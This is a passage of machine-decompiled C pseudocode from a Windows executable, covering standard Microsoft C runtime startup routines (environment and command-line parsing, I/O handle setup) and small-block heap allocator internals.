  if ( v2 && (v3 = *(_DWORD *)(v2 + 8), v3) )
  {
    if ( v3 == 5 )
    {
      *(_DWORD *)(v2 + 8) = 0;
      result = 1;
    }
    else
    {
      if ( v3 != 1 )
      {
        a1 = pxcptinfoptrs;
        pxcptinfoptrs = (int)ExceptionInfo;
        v5 = *(_DWORD *)(v2 + 4);
        if ( v5 == 8 )
        {
          if ( First_FPE_Indx < First_FPE_Indx + Num_FPE )
          {
            v7 = 12 * First_FPE_Indx + 4240384;
            v6 = Num_FPE;
            do
            {
              *(_DWORD *)v7 = 0;
              v7 += 12;
              --v6;
            }
            while ( v6 );
          }
          v8 = *(_DWORD *)v2;
          v9 = fpecode;
          switch ( v8 )
          {
            case 0xC000008E:
              fpecode = 131;
              break;
            case 0xC0000090:
              fpecode = 129;
              break;
            case 0xC0000091:
              fpecode = 132;
              break;
            case 0xC0000093:
              fpecode = 133;
              break;
            case 0xC000008D:
              fpecode = 130;
              break;
            case 0xC000008F:
              fpecode = 134;
              break;
            case 0xC0000092:
              fpecode = 138;
              break;
          }
          ((int (__cdecl *)(signed int))v3)(8);
          fpecode = v9;
        }
        else
        {
          *(_DWORD *)(v2 + 8) = 0;
          ((int (__cdecl *)(signed int))v3)(v5);
        }
        pxcptinfoptrs = a1;
      }
      result = -1;
    }
  }
  else
  {
    result = UnhandledExceptionFilter(ExceptionInfo);
  }
  return result;
}

//----- (00404035) --------------------------------------------------------
signed int __cdecl setenvp()
{
  int v0; // edi@3
  int v1; // esi@3
  int v2; // edi@9
  int v4; // esi@11
  int v5; // eax@12
  int v6; // ebp@12
  int v7; // eax@13
  int v8; // eax@9

  if ( !_mbctype_initialized )
    _initmbctable();
  v1 = aenvptr;
  v0 = 0;
  if ( !aenvptr )
    return -1;
  while ( *(_BYTE *)v1 )
  {
    if ( *(_BYTE *)v1 != 61 )
      ++v0;
    v1 += strlen(v1) + 1;
  }
  v8 = malloc(4 * v0 + 4);
  v2 = v8;
  environ = (LPVOID)v8;
  if ( !v8 )
    return -1;
  v4 = aenvptr;
  while ( 1 )
  {
    if ( !*(_BYTE *)v4 )
    {
      free(aenvptr);
      aenvptr = 0;
      *(_DWORD *)v2 = 0;
      _env_initialized = 1;
      return 0;
    }
    v5 = strlen(v4);
    v6 = v5 + 1;
    if ( *(_BYTE *)v4 != 61 )
      break;
LABEL_15:
    v4 += v6;
  }
  v7 = malloc(v5 + 1);
  *(_DWORD *)v2 = v7;
  if ( v7 )
  {
    strcpy(v7);
    v2 += 4;
    goto LABEL_15;
  }
  free((int)environ);
  environ = 0;
  return -1;
}

//----- (004040FC) --------------------------------------------------------
int __usercall parse_cmdline<eax>(int a1<eax>, int a2<ecx>, int a3<esi>, int a4, int a5)
{
  bool v5; // edx@1
  int v6; // ebx@1
  int v7; // edi@1
  char v8; // cl@4
  unsigned int v9; // edx@27
  signed int v10; // ebx@27
  char v11; // cl@42
  int result; // eax@58
  char v13; // zf@1
  int v14; // ecx@2
  int v15; // ebx@7
  int v16; // ecx@25
  bool v17; // [sp+8h] [bp-4h]@17

  v6 = a5;
  v5 = 0;
  v13 = a4 == 0;
  *(_DWORD *)a3 = 0;
  v7 = a2;
  *(_DWORD *)v6 = 1;
  if ( !v13 )
  {
    v14 = a4;
    a4 += 4;
    *(_DWORD *)v14 = v7;
  }
  do
  {
    if ( *(_BYTE *)a1 == 34 )
    {
      ++a1;
      v5 = v5 == 0;
      v8 = 34;
    }
    else
    {
      ++*(_DWORD *)a3;
      if ( v7 )
        *(_BYTE *)v7++ = *(_BYTE *)a1;
      v8 = *(_BYTE *)a1;
      v15 = *(_BYTE *)a1++;
      if ( byte_40B9E1[v15] & 4 )
      {
        ++*(_DWORD *)a3;
        if ( v7 )
          *(_BYTE *)v7++ = *(_BYTE *)a1;
        ++a1;
      }
      v6 = a5;
      if ( !v8 )
      {
        --a1;
        goto LABEL_17;
      }
    }
  }
  while ( v5 || v8 != 32 && v8 != 9 );
  if ( v7 )
    *(_BYTE *)(v7 - 1) = 0;
LABEL_17:
  v17 = 0;
  while ( *(_BYTE *)a1 )
  {
    while ( *(_BYTE *)a1 == 32 || *(_BYTE *)a1 == 9 )
      ++a1;
    if ( !*(_BYTE *)a1 )
      break;
    if ( a4 )
    {
      v16 = a4;
      a4 += 4;
      *(_DWORD *)v16 = v7;
    }
    ++*(_DWORD *)v6;
    while ( 1 )
    {
      v10 = 1;
      v9 = 0;
      while ( *(_BYTE *)a1 == 92 )
      {
        ++a1;
        ++v9;
      }
      if ( *(_BYTE *)a1 == 34 )
      {
        if ( !(v9 & 1) )
        {
          if ( v17 && *(_BYTE *)(a1 + 1) == 34 )
            ++a1;
          else
            v10 = 0;
          v17 = v17 == 0;
        }
        v9 >>= 1;
      }
      for ( ; v9; --v9 )
      {
        if ( v7 )
          *(_BYTE *)v7++ = 92;
        ++*(_DWORD *)a3;
      }
      v11 = *(_BYTE *)a1;
      if ( !*(_BYTE *)a1 )
        break;
      if ( !v17 && (v11 == 32 || v11 == 9) )
        break;
      if ( v10 )
      {
        if ( v7 )
        {
          if ( byte_40B9E1[v11] & 4 )
          {
            *(_BYTE *)v7++ = v11;
            ++a1;
            ++*(_DWORD *)a3;
          }
          *(_BYTE *)v7++ = *(_BYTE *)a1;
        }
        else
        {
          if ( byte_40B9E1[v11] & 4 )
          {
            ++a1;
            ++*(_DWORD *)a3;
          }
        }
        ++*(_DWORD *)a3;
      }
      ++a1;
    }
    if ( v7 )
      *(_BYTE *)v7++ = 0;
    ++*(_DWORD *)a3;
    v6 = a5;
  }
  result = a4;
  if ( a4 )
    *(_DWORD *)a4 = 0;
  ++*(_DWORD *)v6;
  return result;
}

//----- (00404268) --------------------------------------------------------
signed int __cdecl setargv()
{
  char *v0; // ebx@4
  int v1; // eax@6
  char **v2; // edi@6
  int v3; // esi@6
  signed int result; // eax@7
  int v5; // [sp+Ch] [bp-8h]@6
  int v6; // [sp+10h] [bp-4h]@6

  if ( !_mbctype_initialized )
    _initmbctable();
  byte_40B904 = 0;
  GetModuleFileNameA(0, Filename, 0x104u);
  pgmptr = (int)Filename;
  if ( !acmdln || (v0 = (char *)acmdln, !*(_BYTE *)acmdln) )
    v0 = Filename;
  parse_cmdline((int)v0, 0, (int)&v5, 0, (int)&v6);
  v3 = 4 * v6;
  v1 = malloc(4 * v6 + v5);
  v2 = (char **)v1;
  if ( v1 )
  {
    parse_cmdline((int)v0, v3 + v1, (int)&v5, v1, (int)&v6);
    _argc = v6 - 1;
    _argv = v2;
    result = 0;
  }
  else
  {
    result = -1;
  }
  return result;
}

//----- (0040430A) --------------------------------------------------------
int __cdecl _crtGetEnvironmentStringsA()
{
  int v0; // eax@1
  int v1; // ebx@1
  const WCHAR *v2; // esi@1
  const WCHAR *i; // eax@10
  int v4; // eax@13
  int v5; // ebp@13
  int v6; // eax@14
  LPSTR v8; // eax@22
  CHAR *v9; // esi@22
  int v10; // eax@26
  DWORD v11; // ebp@26
  int v12; // edi@26
  LPWSTR v13; // eax@2
  LPWSTR v14; // eax@9
  int v15; // eax@13
  DWORD v16; // eax@26
  int cchWideChar; // [sp+14h] [bp-4h]@13
  int v18; // [sp+10h] [bp-8h]@14

  v0 = dword_40B908;
  v1 = 0;
  v2 = 0;
  if ( !dword_40B908 )
  {
    v13 = GetEnvironmentStringsW();
    v2 = v13;
    if ( v13 )
    {
      dword_40B908 = 1;
LABEL_8:
      if ( v2 || (v14 = GetEnvironmentStringsW(), v2 = v14, v14) )
      {
        for ( i = v2; *i; ++i )
        {
          do
            ++i;
          while ( *i );
        }
        v15 = ((signed int)((char *)i - (char *)v2) >> 1) + 1;
        cchWideChar = v15;
        v4 = WideCharToMultiByte(0, 0, v2, v15, 0, 0, 0, 0);
        v5 = v4;
        if ( v4 )
        {
          v6 = malloc(v4);
          v18 = v6;
          if ( v6 )
          {
            if ( !WideCharToMultiByte(0, 0, v2, cchWideChar, (LPSTR)v6, v5, 0, 0) )
            {
              free(v18);
              v18 = 0;
            }
            v1 = v18;
          }
        }
        FreeEnvironmentStringsW((LPWSTR)v2);
        return v1;
      }
      return 0;
    }
    if ( GetLastError() == 120 )
    {
      v0 = 2;
      dword_40B908 = 2;
    }
    else
    {
      v0 = dword_40B908;
    }
  }
  if ( v0 == 1 )
    goto LABEL_8;
  if ( v0 != 2 && v0 || (v8 = GetEnvironmentStrings(), v9 = v8, !v8) )
    return 0;
  for ( ; *v8; ++v8 )
  {
    do
      ++v8;
    while ( *v8 );
  }
  v16 = v8 - v9 + 1;
  v11 = v16;
  v10 = malloc(v16);
  v12 = v10;
  if ( v10 )
    memcpy(v10, v9, v11);
  else
    v12 = 0;
  FreeEnvironmentStringsA(v9);
  return v12;
}

//----- (0040442C) --------------------------------------------------------
signed int __cdecl ioinit()
{
  int v0; // eax@1
  signed int result; // eax@2
  int v2; // ecx@3
  HANDLE *v3; // ebx@8
  LPBYTE v4; // ebp@8
  UINT v5; // esi@8
  _UNKNOWN *v6; // edi@11
  int v7; // eax@12
  int v8; // ecx@13
  signed int i; // edi@19
  signed int v10; // ebx@26
  int v11; // esi@27
  DWORD v12; // eax@29
  HANDLE v13; // eax@31
  HANDLE v14; // edi@31
  DWORD v15; // eax@32
  signed int v16; // eax@33
  int v17; // eax@24
  struct _STARTUPINFOA StartupInfo; // [sp+0h] [bp-44h]@6

  v0 = malloc(0x100u);
  if ( v0 )
  {
    _pioinfo[0] = v0;
    nhandle = 32;
    v2 = v0 + 256;
    while ( v0 < (unsigned int)v2 )
    {
      *(_DWORD *)v0 = -1;
      *(_BYTE *)(v0 + 4) = 0;
      *(_BYTE *)(v0 + 5) = 10;
      v0 += 8;
      v2 = _pioinfo[0] + 256;
    }
    GetStartupInfoA(&StartupInfo);
    if ( StartupInfo.cbReserved2 && StartupInfo.lpReserved2 )
    {
      v5 = *(_DWORD *)StartupInfo.lpReserved2;
      v4 = StartupInfo.lpReserved2 + 4;
      v3 = (HANDLE *)&StartupInfo.lpReserved2[*(_DWORD *)StartupInfo.lpReserved2 + 4];
      if ( *(_DWORD *)StartupInfo.lpReserved2 >= 2048 )
        v5 = 2048;
      if ( (signed int)nhandle < (signed int)v5 )
      {
        v6 = &unk_40BC44;
        while ( 1 )
        {
          v7 = malloc(0x100u);
          if ( !v7 )
            break;
          nhandle += 32;
          *(_DWORD *)v6 = v7;
          v8 = v7 + 256;
          while ( v7 < (unsigned int)v8 )
          {
            *(_DWORD *)v7 = -1;
            *(_BYTE *)(v7 + 4) = 0;
            *(_BYTE *)(v7 + 5) = 10;
            v7 += 8;
            v8 = *(_DWORD *)v6 + 256;
          }
          v6 = (char *)v6 + 4;
          if ( (signed int)nhandle >= (signed int)v5 )
            goto LABEL_19;
        }
        v5 = nhandle;
      }
LABEL_19:
      for ( i = 0; i < (signed int)v5; ++v3 )
      {
        if ( *v3 != (HANDLE)-1 )
        {
          if ( *v4 & 1 )
          {
            if ( *v4 & 8 || GetFileType(*v3) )
            {
              v17 = _pioinfo[i >> 5] + 8 * (i & 0x1F);
              *(_DWORD *)v17 = *v3;
              *(_BYTE *)(v17 + 4) = *v4;
            }
          }
        }
        ++i;
        ++v4;
      }
    }
    v10 = 0;
    do
    {
      v11 = _pioinfo[0] + 8 * v10;
      if ( *(_DWORD *)v11 == -1 )
      {
        *(_BYTE *)(v11 + 4) = -127;
        if ( v10 )
          v12 = -(v10 != 1) - 11;
        else
          v12 = -10;
        v13 = GetStdHandle(v12);
        v14 = v13;
        if ( v13 != (HANDLE)-1 && (v15 = GetFileType(v13), v15) && (v16 = (_BYTE)v15, *(_DWORD *)v11 = v14, v16 != 2) )
        {
          if ( v16 == 3 )
            *(_BYTE *)(v11 + 4) |= 8u;
        }
        else
        {
          *(_BYTE *)(v11 + 4) |= 0x40u;
        }
      }
      else
      {
        *(_BYTE *)(v11 + 4) |= 0x80u;
      }
      ++v10;
    }
    while ( v10 < 3 );
    SetHandleCount(nhandle);
    result = 0;
  }
  else
  {
    result = -1;
  }
  return result;
}

//----- (004045D7) --------------------------------------------------------
void __cdecl RTC_Initialize()
{
  unsigned int v0; // [sp+Ch] [bp-1Ch]@1
  CPPEH_RECORD ms_exc; // [sp+10h] [bp-18h]@3

  v0 = (unsigned int)&_rtc_izz;
  while ( v0 < (unsigned int)&_rtc_izz )
  {
    ms_exc.disabled = 0;
    if ( *(_DWORD *)v0 )
      (*(int (**)(void))v0)();
    v0 += 4;
  }
}

//----- (0040461B) --------------------------------------------------------
void __cdecl RTC_Terminate()
{
  unsigned int v0; // [sp+Ch] [bp-1Ch]@1
  CPPEH_RECORD ms_exc; // [sp+10h] [bp-18h]@3

  v0 = (unsigned int)&_rtc_tzz;
  while ( v0 < (unsigned int)&_rtc_tzz )
  {
    ms_exc.disabled = 0;
    if ( *(_DWORD *)v0 )
      (*(int (**)(void))v0)();
    v0 += 4;
  }
}

//----- (0040465F) --------------------------------------------------------
signed int __cdecl _heap_select()
{
  signed int result; // eax@3

  if ( osplatform != 2 || (unsigned int)winmajor < 5 )
    result = 3;
  else
    result = 1;
  return result;
}

//----- (00404679) --------------------------------------------------------
signed int __cdecl heap_init(int a1)
{
  HANDLE v2; // eax@1
  int v3; // eax@2

  v2 = HeapCreate(a1 == 0, 0x1000u, 0);
  crtheap = v2;
  if ( !v2 )
    return 0;
  v3 = _heap_select();
  _active_heap = v3;
  if ( v3 == 3 && !_sbh_heap_init(1016) )
  {
    HeapDestroy(crtheap);
    return 0;
  }
  return 1;
}

//----- (004046CA) --------------------------------------------------------
int __cdecl _sbh_heap_init(int a1)
{
  int result; // eax@1

  result = (int)HeapAlloc(crtheap, 0, 0x140u);
  _sbh_pHeaderList = (LPVOID)result;
  if ( result )
  {
    _sbh_pHeaderDefer = 0;
    _sbh_cntHeaderList = 0;
    _sbh_pHeaderScan = result;
    _sbh_threshold = a1;
    _sbh_sizeHeaderList = 16;
    result = 1;
  }
  return result;
}

//----- (00404712) --------------------------------------------------------
LPVOID __cdecl _sbh_find_block(int a1)
{
  LPVOID result; // eax@1

  result = _sbh_pHeaderList;
  while ( result < (char *)_sbh_pHeaderList + 20 * _sbh_cntHeaderList )
  {
    if ( (unsigned int)(a1 - *((_DWORD *)result + 3)) < 0x100000 )
      return result;
    result = (char *)result + 20;
  }
  return 0;
}

//----- (0040473D) --------------------------------------------------------
int __cdecl _sbh_free_block(int a1, int a2)
{
  int result; // eax@1
  signed int v3; // ecx@1
  int v4; // edi@1
  int v5; // esi@1
  int v6; // ebx@2
  int v7; // edx@3
  unsigned int v8; // ebx@7
  unsigned int v9; // ebx@9
  int v10; // edx@13
  int v11; // ebx@16
  unsigned int v12; // esi@23
  unsigned int v13; // esi@25
  int v14; // eax@42
  int v15; // ecx@7
  char v16; // zf@7
  int v17; // ecx@9
  char v18; // zf@9
  signed int v19; // ecx@18
  char v20; // zf@23
  char v21; // zf@25
  int v22; // ecx@32
  int v23; // ebx@32
  char v24; // cl@33
  int v25; // eax@40
  char v26; // zf@40
  int v27; // [sp+8h] [bp-10h]@1
  int v28; // [sp+14h] [bp-4h]@1
  int v29; // [sp+Ch] [bp-Ch]@2
  signed int v30; // [sp+10h] [bp-8h]@2

  result = *(_DWORD *)(a1 + 16);
  v5 = a2 - 4;
  v4 = (unsigned int)(a2 - *(_DWORD *)(a1 + 12)) >> 15;
  v27 = 516 * v4 + result + 324;
  v3 = *(_DWORD *)(a2 - 4) - 1;
  v28 = *(_DWORD *)(a2 - 4) - 1;
  if ( !(v3 & 1) )
  {
    v6 = v3 + v5;
    v29 = *(_DWORD *)(v3 + v5);
    v30 = *(_DWORD *)(a2 - 8);
    a2 = v3 + v5;
    if ( !(v29 & 1) )
    {
      v7 = (v29 >> 4) - 1;
      if ( (unsigned int)v7 > 0x3F )
        v7 = 63;
      if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(v6 + 8) )
      {
        if ( (unsigned int)v7 >= 0x20 )
        {
          v17 = v7 + result + 4;
          v9 = ~(0x80000000u >> (v7 - 32));
          *(_DWORD *)(result + 4 * v4 + 196) &= v9;
          v18 = *(_BYTE *)v17 == 1;
          *(_BYTE *)(v7 + result + 4) = *(_BYTE *)v17 - 1;
          if ( v18 )
            *(_DWORD *)(a1 + 4) &= v9;
        }
        else
        {
          v15 = v7 + result + 4;
          v8 = ~(0x80000000u >> v7);
          *(_DWORD *)(result + 4 * v4 + 68) &= v8;
          v16 = *(_BYTE *)v15 == 1;
          *(_BYTE *)(v7 + result + 4) = *(_BYTE *)v15 - 1;
          if ( v16 )
            *(_DWORD *)a1 &= v8;
        }
        v6 = a2;
      }
      v3 = v29 + v28;
      *(_DWORD *)(*(_DWORD *)(v6 + 8) + 4) = *(_DWORD *)(v6 + 4);
      *(_DWORD *)(*(_DWORD *)(a2 + 4) + 8) = *(_DWORD *)(a2 + 8);
      v28 = v3;
    }
    v10 = (v3 >> 4) - 1;
    if ( (unsigned int)v10 > 0x3F )
      v10 = 63;
    v29 = v30 & 1;
    if ( v30 & 1 )
    {
      v11 = a1;
    }
    else
    {
      a2 = v5 - v30;
      v11 = (v30 >> 4) - 1;
      if ( (unsigned int)v11 > 0x3F )
        v11 = 63;
      v19 = v30 + v3;
      v10 = (v19 >> 4) - 1;
      v28 = v19;
      if ( (unsigned int)v10 > 0x3F )
        v10 = 63;
      if ( v11 != v10 )
      {
        if ( *(_DWORD *)(a2 + 4) == *(_DWORD *)(a2 + 8) )
        {
          if ( (unsigned int)v11 >= 0x20 )
          {
            v13 = ~(0x80000000u >> (v11 - 32));
            *(_DWORD *)(result + 4 * v4 + 196) &= v13;
            v21 = *(_BYTE *)(v11 + result + 4)-- == 1;
            if ( v21 )
              *(_DWORD *)(a1 + 4) &= v13;
          }
          else
          {
            v12 = ~(0x80000000u >> v11);
            *(_DWORD *)(result + 4 * v4 + 68) &= v12;
            v20 = *(_BYTE *)(v11 + result + 4)-- == 1;
            if ( v20 )
              *(_DWORD *)a1 &= v12;
          }
        }
        *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4) = *(_DWORD *)(a2 + 4);
        *(_DWORD *)(*(_DWORD *)(a2 + 4) + 8) = *(_DWORD *)(a2 + 8);
      }
      v5 = a2;
    }
    if ( v29 || v11 != v10 )
    {
      v22 = v27 + 8 * v10;
      v23 = *(_DWORD *)(v22 + 4);
      *(_DWORD *)(v5 + 8) = v27 + 8 * v10;
      *(_DWORD *)(v5 + 4) = v23;
      *(_DWORD *)(v22 + 4) = v5;
      *(_DWORD *)(*(_DWORD *)(v5 + 4) + 8) = v5;
      if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(v5 + 8) )
      {
        v24 = *(_BYTE *)(v10 + result + 4);
        BYTE3(a2) = *(_BYTE *)(v10 + result + 4);
        *(_BYTE *)(v10 + result + 4) = v24 + 1;
        if ( (unsigned int)v10 >= 0x20 )
        {
          if ( !BYTE3(a2) )
            *(_DWORD *)(a1 + 4) |= 0x80000000u >> (v10 - 32);
          *(_DWORD *)(result + 4 * v4 + 196) |= 0x80000000u >> (v10 - 32);
        }
        else
        {
          if ( !BYTE3(a2) )
            *(_DWORD *)a1 |= 0x80000000u >> v10;
          *(_DWORD *)(result + 4 * v4 + 68) |= 0x80000000u >> v10;
        }
      }
    }
    v25 = v28;
    *(_DWORD *)v5 = v28;
    *(_DWORD *)(v25 + v5 - 4) = v25;
    result = v27;
    v26 = *(_DWORD *)v27-- == 1;
    if ( v26 )
    {
      if ( _sbh_pHeaderDefer )
      {
        VirtualFree((LPVOID)(*(_DWORD *)(_sbh_pHeaderDefer + 12) + (_sbh_indGroupDefer << 15)), 0x8000u, 0x4000u);
        *(_DWORD *)(_sbh_pHeaderDefer + 8) |= 0x80000000u >> _sbh_indGroupDefer;
        *(_DWORD *)(*(_DWORD *)(_sbh_pHeaderDefer + 16) + 4 * _sbh_indGroupDefer + 196) = 0;
        --*(_BYTE *)(*(_DWORD *)(_sbh_pHeaderDefer + 16) + 67);
        v14 = _sbh_pHeaderDefer;
        if ( !*(_BYTE *)(*(_DWORD *)(_sbh_pHeaderDefer + 16) + 67) )
        {
          *(_DWORD *)(_sbh_pHeaderDefer + 4) &= 0xFFFFFFFEu;
          v14 = _sbh_pHeaderDefer;
        }
        if ( *(_DWORD *)(v14 + 8) == -1 )
        {
          VirtualFree(*(LPVOID *)(v14 + 12), 0, 0x8000u);
          HeapFree(crtheap, 0, *(LPVOID *)(_sbh_pHeaderDefer + 16));
          memmove(
            _sbh_pHeaderDefer,
            _sbh_pHeaderDefer + 20,
            _sbh_pHeaderList + 20 * _sbh_cntHeaderList-- - _sbh_pHeaderDefer - 20);
          if ( a1 > (unsigned int)_sbh_pHeaderDefer )
            a1 -= 20;
          _sbh_pHeaderScan = (int)_sbh_pHeaderList;
        }
      }
      result = a1;
      _sbh_pHeaderDefer = a1;
      _sbh_indGroupDefer = v4;
    }
  }
  return result;
}

//----- (00404A55) --------------------------------------------------------
char *__cdecl _sbh_alloc_new_region()
{
  int v0; // eax@1
  void *v1; // eax@2
  char *v3; // esi@5
  LPVOID v4; // eax@5
  LPVOID v5; // eax@7

  v0 = _sbh_cntHeaderList;
  if ( _sbh_cntHeaderList == _sbh_sizeHeaderList )
  {
    v1 = HeapReAlloc(crtheap, 0, _sbh_pHeaderList, 4 * (5 * _sbh_sizeHeaderList + 80));
    if ( !v1 )
      return 0;
    _sbh_sizeHeaderList += 16;
    _sbh_pHeaderList = v1;
    v0 = _sbh_cntHeaderList;
  }
  v3 = (char *)_sbh_pHeaderList + 20 * v0;
  v4 = HeapAlloc(crtheap, 8u, 0x41C4u);
  *((_DWORD *)v3 + 4) = v4;
  if ( !v4 )
    return 0;
  v5 = VirtualAlloc(0, 0x100000u, 0x2000u, 4u);
  *((_DWORD *)v3 + 3) = v5;
  if ( !v5 )
  {
    HeapFree(crtheap, 0, *((LPVOID *)v3 + 4));
    return 0;
  }
  *((_DWORD *)v3 + 2) = -1;
  *(_DWORD *)v3 = 0;
  *((_DWORD *)v3 + 1) = 0;
  ++_sbh_cntHeaderList;
  **((_DWORD **)v3 + 4) = -1;
  return v3;
}

//----- (00404B0C) --------------------------------------------------------
signed int __cdecl _sbh_alloc_new_group(int a1)
{
  int v1; // eax@1
  int v2; // ecx@1
  signed int v3; // ebx@1
  int v4; // esi@1
  int v5; // eax@4
  signed int v6; // edx@4
  int v7; // edi@6
  signed int result; // eax@7
  int v9; // edx@8
  int v10; // eax@9
  signed int v11; // ecx@9
  int v12; // eax@12
  int v13; // eax@12
  char v14; // cl@12
  char v15; // zf@12
  int v16; // [sp+Ch] [bp-8h]@4
  int v17; // [sp+10h] [bp-4h]@8

  v2 = a1;
  v1 = *(_DWORD *)(a1 + 8);
  v4 = *(_DWORD *)(a1 + 16);
  v3 = 0;
  while ( v1 >= 0 )
  {
    v1 *= 2;
    ++v3;
  }
  v5 = 516 * v3 + v4 + 324;
  v16 = 516 * v3 + v4 + 324;
  v6 = 63;
  do
  {
    *(_DWORD *)(v5 + 8) = v5;
    *(_DWORD *)(v5 + 4) = v5;
    v5 += 8;
    --v6;
  }
  while ( v6 );
  v7 = *(_DWORD *)(v2 + 12) + (v3 << 15);
  if ( VirtualAlloc((LPVOID)(*(_DWORD *)(v2 + 12) + (v3 << 15)), 0x8000u, 0x1000u, 4u) )
  {
    v9 = v7 + 28672;
    v17 = v7 + 28672;
    if ( v7 < (unsigned int)(v7 + 28672) )
    {
      v10 = v7 + 16;
      v11 = 8;
      do
      {
        *(_DWORD *)(v10 - 8) = -1;
        *(_DWORD *)(v10 + 4076) = -1;
        *(_DWORD *)v10 = v10 + 4092;
        *(_DWORD *)(v10 - 4) = 4080;
        *(_DWORD *)(v10 + 4) = v10 - 4100;
        *(_DWORD *)(v10 + 4072) = 4080;
        v10 += 4096;
        --v11;
      }
      while ( v11 );
      v9 = v17;
    }
    v13 = v16 + 504;
    *(_DWORD *)(v16 + 508) = v7 + 12;
    *(_DWORD *)(v7 + 20) = v16 + 504;
    *(_DWORD *)(v13 + 8) = v9 + 12;
    *(_DWORD *)(v9 + 16) = v13;
    *(_DWORD *)(v4 + 4 * v3 + 68) = 0;
    *(_DWORD *)(v4 + 4 * v3 + 196) = 1;
    LOBYTE(v13) = *(_BYTE *)(v4 + 67);
    v14 = (_BYTE)v13 + 1;
    v15 = (_BYTE)v13 == 0;
    v12 = a1;
    *(_BYTE *)(v4 + 67) = v14;
    if ( v15 )
      *(_DWORD *)(v12 + 4) |= 1u;
    *(_DWORD *)(v12 + 8) &= ~(0x80000000u >> v3);
    result = v3;
  }
  else
  {
    result = -1;
  }
  return result;
}

//----- (00404C12) --------------------------------------------------------
signed int __cdecl _sbh_resize_block(int a1, int a2, signed int a3)
{
  int v3; // eax@1
  unsigned int v4; // edx@1
  int v5; // ecx@1
  signed int v6; // ebx@1
  int v7; // edi@1
  int v8; // esi@1
  int v9; // ecx@4
  unsigned int v10; // ebx@8
  unsigned int v11; // ebx@10
  int v12; // ecx@13
  int v13; // edi@13
  int v14; // eax@19
  int v15; // ecx@19
  int v16; // edx@24
  int v18; // ebx@29
  int v19; // esi@29
  int v20; // esi@32
  unsigned int v21; // ebx@36
  unsigned int v22; // ebx@38
  int v23; // eax@47
  int v24; // ecx@47
  unsigned int v25; // ebx@8
  int v26; // ecx@8
  char v27; // zf@8
  unsigned int v28; // ebx@10
  int v29; // ecx@10
  char v30; // zf@10
  signed int v31; // ebx@15
  char v32; // cl@16
  signed int v33; // ecx@24
  int v34; // eax@24
  int v35; // ecx@29
  unsigned __int8 v36; // zf@29
  unsigned int v37; // ebx@36
  int v38; // esi@36
  char v39; // zf@36
  int v40; // ecx@38
  char v41; // zf@38
  signed int v42; // esi@41
  int v43; // ecx@43
  int v44; // edi@43
  char v45; // cl@44
  signed int v46; // eax@52
  int v47; // [sp+Ch] [bp-Ch]@1
  signed int v48; // [sp+14h] [bp-4h]@1
  int v49; // [sp+10h] [bp-8h]@4

  v3 = *(_DWORD *)(a1 + 16);
  v4 = (unsigned int)(a2 - *(_DWORD *)(a1 + 12)) >> 15;
  v47 = 516 * v4 + v3 + 324;
  v8 = (a3 + 23) & 0xFFFFFFF0;
  v5 = *(_DWORD *)(a2 - 4) - 1;
  v7 = v5 + a2 - 4;
  v6 = *(_DWORD *)v7;
  a3 = *(_DWORD *)(a2 - 4) - 1;
  v48 = v6;
  if ( v8 <= v5 )
  {
    if ( v8 < v5 )
    {
      a3 -= v8;
      v35 = v8 + 1;
      *(_DWORD *)(a2 - 4) = v8 + 1;
      v18 = a2 + v8 - 4;
      v19 = (a3 >> 4) - 1;
      v36 = a3 >> 4 == 64;
      a2 = v18;
      *(_DWORD *)(v18 - 4) = v35;
      if ( !((unsigned int)v19 < 0x3F | v36) )
        v19 = 63;
      if ( !(v48 & 1) )
      {
        v20 = (v48 >> 4) - 1;
        if ( (unsigned int)v20 > 0x3F )
          v20 = 63;
        if ( *(_DWORD *)(v7 + 4) == *(_DWORD *)(v7 + 8) )
        {
          if ( (unsigned int)v20 >= 0x20 )
          {
            v40 = v20 + v3 + 4;
            v22 = ~(0x80000000u >> (v20 - 32));
            *(_DWORD *)(v3 + 4 * v4 + 196) &= v22;
            v41 = *(_BYTE *)v40 == 1;
            *(_BYTE *)(v20 + v3 + 4) = *(_BYTE *)v40 - 1;
            if ( v41 )
              *(_DWORD *)(a1 + 4) &= v22;
          }
          else
          {
            v37 = 0x80000000u >> v20;
            v38 = v20 + v3 + 4;
            v21 = ~v37;
            *(_DWORD *)(v3 + 4 * v4 + 68) &= v21;
            v39 = *(_BYTE *)v38-- == 1;
            if ( v39 )
              *(_DWORD *)a1 &= v21;
          }
          v18 = a2;
        }
        *(_DWORD *)(*(_DWORD *)(v7 + 8) + 4) = *(_DWORD *)(v7 + 4);
        *(_DWORD *)(*(_DWORD *)(v7 + 4) + 8) = *(_DWORD *)(v7 + 8);
        v42 = v48 + a3;
        a3 += v48;
        v19 = (v42 >> 4) - 1;
        if ( (unsigned int)v19 > 0x3F )
          v19 = 63;
      }
      v43 = v47 + 8 * v19;
      v44 = *(_DWORD *)(v43 + 4);
      *(_DWORD *)(v18 + 8) = v47 + 8 * v19;
      *(_DWORD *)(v18 + 4) = v44;
      *(_DWORD *)(v43 + 4) = v18;
      *(_DWORD *)(*(_DWORD *)(v18 + 4) + 8) = v18;
      if ( *(_DWORD *)(v18 + 4) == *(_DWORD *)(v18 + 8) )
      {
        v45 = *(_BYTE *)(v19 + v3 + 4);
        BYTE3(a2) = *(_BYTE *)(v19 + v3 + 4);
        *(_BYTE *)(v19 + v3 + 4) = v45 + 1;
        if ( (unsigned int)v19 >= 0x20 )
        {
          if ( !BYTE3(a2) )
            *(_DWORD *)(a1 + 4) |= 0x80000000u >> (v19 - 32);
          v23 = v3 + 4 * v4 + 196;
          v24 = v19 - 32;
        }
        else
        {
          if ( !BYTE3(a2) )
            *(_DWORD *)a1 |= 0x80000000u >> v19;
          v23 = v3 + 4 * v4 + 68;
          LOBYTE(v24) = v19;
        }
        *(_DWORD *)v23 |= 0x80000000u >> v24;
      }
      v46 = a3;
      *(_DWORD *)v18 = a3;
      *(_DWORD *)(v46 + v18 - 4) = v46;
    }
  }
  else
  {
    if ( v6 & 1 || v8 > v5 + v6 )
      return 0;
    v9 = (v48 >> 4) - 1;
    v49 = (v48 >> 4) - 1;
    if ( (unsigned int)v9 > 0x3F )
    {
      v9 = 63;
      v49 = 63;
    }
    if ( *(_DWORD *)(v7 + 4) == *(_DWORD *)(v7 + 8) )
    {
      if ( (unsigned int)v9 >= 0x20 )
      {
        v28 = 0x80000000u >> (v9 - 32);
        v29 = v49 + v3 + 4;
        v11 = ~v28;
        *(_DWORD *)(v3 + 4 * v4 + 196) &= v11;
        v30 = *(_BYTE *)v29-- == 1;
